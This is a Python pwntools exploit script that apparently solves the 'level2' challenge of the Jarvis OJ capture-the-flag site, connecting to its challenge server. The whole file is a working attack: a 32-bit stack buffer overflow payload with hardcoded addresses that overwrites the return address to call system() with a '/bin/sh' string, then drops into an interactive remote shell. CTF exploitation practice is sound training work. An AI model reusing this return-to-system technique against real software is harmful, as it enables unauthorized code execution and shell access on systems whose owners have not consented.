#!/usr/bin/python

from pwn import *

def exploit():
    global io
    system_addr = 0x08048320
    binsh_addr  = 0x0804A024
    
    payload   = 'A' * 0x88
    payload  += 'A' * 0x4 
    payload  += p32(system_addr) # ret addr
    payload  += 'A' * 0x4        # ebp --> push ebp 
    payload  += p32(binsh_addr)  # binsh
    
    io.sendline(payload)
    
    # get shell
    io.interactive()


if __name__ == '__main__':
    target_elf = './level2'
    #target_libc = './libc-2.23.so'

    target_host = 'pwn2.jarvisoj.com'
    target_port = '9878'

    #context.log_level = 'debug'
    #context.terminal = ['tmux', 'splitw', '-v']

    #gdb.attach(proc.pidof(p)[0])

    elf = ELF(target_elf)
    #libc = ELF(target_libc)

    LOCAL = True
    LOCAL = False

    if LOCAL:
        #io = process(target_elf, env={'LD_PRELOAD':target_libc})
        io = process(target_elf)
        gdb.attach(io, 
        '''b *0x08048475
           x/sg 0x0804A024        
        #b *0x0000000000400DC8''')
    else:
        io = remote(target_host, target_port)
    
    exploit()


